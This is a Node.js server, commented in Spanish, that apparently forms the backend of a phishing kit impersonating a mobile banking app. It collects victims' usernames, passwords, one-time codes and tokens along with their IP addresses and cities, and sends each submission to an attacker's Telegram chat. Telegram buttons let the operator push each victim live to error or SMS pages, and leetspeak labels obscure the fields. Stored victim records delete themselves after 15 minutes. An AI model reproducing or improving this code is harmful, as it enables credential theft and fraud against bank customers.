const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const https = require("https");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const agent = new https.Agent({ family: 4 });

const CLIENTES_DIR = "./clientes";
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// 📡 Funciones auxiliares
function obtenerIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  return (
    (forwarded ? forwarded.split(",")[0] : req.socket.remoteAddress) ||
    "desconocida"
  );
}

async function obtenerCiudad(ip) {
  try {
    const { data } = await axios.get(`https://ipwhois.app/json/${ip}`);
    return data.city || "desconocida";
  } catch {
    return "desconocida";
  }
}

function guardarCliente(txid, data) {
  fs.writeFileSync(`${CLIENTES_DIR}/${txid}.json`, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  return fs.existsSync(ruta) ? JSON.parse(fs.readFileSync(ruta)) : null;
}

// 🧹 Limpieza automática cada 10 minutos
setInterval(() => {
  const ahora = Date.now();
  fs.readdirSync(CLIENTES_DIR).forEach((file) => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMin = (ahora - stats.mtimeMs) / 60000;
    if (edadMin > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file}`);
    }
  });
}, 10 * 60 * 1000);

// 🟣 Paso 1: Enviar primer formulario (usuario)
app.post("/enviar", async (req, res) => {
  const { usar, txid, pais } = req.body;
  if (!usar || !txid) return res.status(400).send("Campos faltantes");

  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟣B3M0VIL APP🟣

PAYS: ${pais || "Desconocido"}
US4R: <code>${usar}</code>

IP: ${ip || "Desconocida"}
Ciudad: ${ciudad || "Desconocida"}
`;

  const cliente = { status: "esperando", usar, ip, ciudad, pais };
  guardarCliente(txid, cliente);

  // Teclado con botones callback
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CL4V3", callback_data: `clavsola:${txid}` },
        { text: "🔑 CL4V3+TOK", callback_data: `clavetok:${txid}` }
      ],
    ],
  };

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error enviando a Telegram:", err.message);
    res.status(500).send("Error al enviar a Telegram");
  }
});

// 🟣 Paso 2: Enviar segundo formulario (clave + token)
app.post("/enviar3", async (req, res) => {
  const { usar, txid, clavv, ote, ote2, ote3, ote4, ote5, ote6, pais } = req.body;
  if (!usar || !txid)
    return res.status(400).send("Campos faltantes en formulario CLAVE+OTP");

  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const cliente = { status: "esperando", usar, clavv, ip, ciudad, pais };
  guardarCliente(txid, cliente);

  const mensaje = `
🔐🟣B3M0VIL APP🟣
ID: <code>${txid}</code>

PAYS: ${pais || "Desconocido"}
US4R: <code>${usar}</code>
CONTR4: <code>${clavv}</code>

0TP: <code>${ote}${ote2}${ote3}${ote4}${ote5}${ote6}</code>

IP: ${ip}
Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "❌ERROR", callback_data: `errorlogo:${txid}` },
        { text: "💬SMS", callback_data: `esemese:${txid}` },
      ],
    ],
  };

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error enviando a Telegram:", err.message);
    res.status(500).send("Error al enviar a Telegram");
  }
});

// 🟣 Webhook de Telegram (botones callback)
app.post("/webhook", async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const [accion, txid] = callback.data.split(":");
    const cliente = cargarCliente(txid) || {};
    cliente.status = accion;
    guardarCliente(txid, cliente);

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      callback_query_id: callback.id,
      text: `Has seleccionado: ${accion}`,
    });

    res.sendStatus(200);
  } else {
    res.sendStatus(200);
  }
});

// 🟣 Consultar estado desde frontend
app.get("/sendStatus.php", (req, res) => {
  const { txid } = req.query;
  const cliente = cargarCliente(txid) || { status: "esperando" };
  res.json({ status: cliente.status });
});

// 🟣 Paso final (clave o token final)
// 🟣 Paso final (clave o token final)
app.post("/enviarFinal", async (req, res) => {
  const { usar, txid, password, token, clavv, pais } = req.body;
  if (!usar || !txid)
    return res.status(400).send("Campos faltantes en formulario FINAL");

  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  // 🧾 Guarda nuevo cliente igual que en enviar3
  const cliente = { status: "esperando", usar, clavv, ip, ciudad, pais };
  guardarCliente(txid, cliente);

  const mensaje = `
🟣B3M0VIL APP🟣
🆔 ID: <code>${txid}</code>

PAYS: ${pais || "Desconocido"}
US4R: <code>${usar}</code>
${password ? `CONTR4: <code>${password}</code>` : ""}
${token ? `T0K3N: <code>${token}</code>` : ""}

IP: ${ip}
Ciudad: ${ciudad}
`;

  // 🔘 Botones callback (igual que en enviar3)
  const keyboard = {
    inline_keyboard: [
      [
        { text: "❌ERROR", callback_data: `errorlogo:${txid}` },
        { text: "💬SMS", callback_data: `esemese:${txid}` },
      ],
    ],
  };

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: "HTML",
      reply_markup: keyboard,
    });

    res.json({ redirect: "crgs.html" });
  } catch (err) {
    console.error("❌ Error enviando mensaje final:", err.message);
    res.status(500).send("Error al enviar mensaje final");
  }
});


// 🟢 Servidor activo
app.get("/", (req, res) => res.send("Servidor activo 🚀"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor activo en puerto ${PORT}`));
